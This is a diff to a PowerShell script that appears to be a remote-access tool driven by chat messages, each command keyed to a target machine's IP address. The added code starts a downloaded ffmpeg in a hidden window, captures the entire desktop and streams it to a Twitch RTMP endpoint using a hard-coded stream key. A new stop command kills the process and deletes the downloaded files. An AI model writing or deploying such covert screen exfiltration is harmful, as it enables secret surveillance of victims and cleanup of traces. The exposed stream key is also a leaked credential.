@@ -467,24 +467,16 @@ function twitch($STREAM_KEY) {
 
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
-
-    $INRES="640x480" # input resolution
-    $OUTRES="640x480" # output resolution
-    $FPS="15" # target FPS
-    $GOP="30" # i-frame interval, should be double of FPS, 
-    $GOPMIN="15" # min i-frame interval, should be equal to fps, 
-    $THREADS="2" # max 6
-    $CBR="1000k" # constant bitrate (should be between 1000k - 3000k)
-    $QUALITY="ultrafast"  # one of the many FFMPEG preset
-    $AUDIO_RATE="44100"
-    #STREAM_KEY="$1" # use the terminal command Streaming streamkeyhere to stream your video to twitch or justin
-    $SERVER="live-mad" # twitch server in Madrid, see http://bashtech.net/twitch/ingest.php to change 
-     
-    $args = "-f x11grab -s $INRES -r $FPS -i :0.0 -f alsa -i pulse -f flv -ac 2 -ar $AUDIO_RATE -vcodec libx264 -g $GOP -keyint_min $GOPMIN -b:v $CBR -minrate $CBR -maxrate $CBR -pix_fmt yuv420p -s $OUTRES -preset $QUALITY -tune film -acodec libmp3lame -threads $THREADS -strict normal -bufsize $CBR 'rtmp://'+$SERVER+'.twitch.tv/app/'+$STREAM_KEY"
     $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
+    Start-Process -Filepath $FFmpeg "-f gdigrab -s 1920x1080 -framerate 15 -i desktop -c:v libx264 -preset fast -pix_fmt yuv420p -s 1280x800 -threads 0 -f flv rtmp://live-mad.twitch.tv/app/live_166678091_KFMc6ih9pgfBESfK4QN74iLpz7c6a8" -windowstyle hidden
+}
 
-    Start-Sleep -Seconds 10
-    Start-Process $FFmpeg -ArgumentList $args -WindowStyle Hidden
+function stoptwitch {
+    taskkill /F /IM ffmpeg.exe
+    
+    Sleep -Seconds 5
+    Remove-Item -Recurse "C:\Users\$env:username\Documents\FFmpeg"
+    Remove-Item "C:\Users\$env:username\Documents\FFmpeg.zip"
 }
 
 #####################
@@ -646,6 +638,9 @@ While ($DoNotExit)  {
       "/twitch $ipV4 *"{
         $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
         twitch $STREAM_KEY
+      }
+      "/stoptwitch $ipV4"{
+        stoptwitch
       }
 	  default  {
 	    #The message sent is unknown
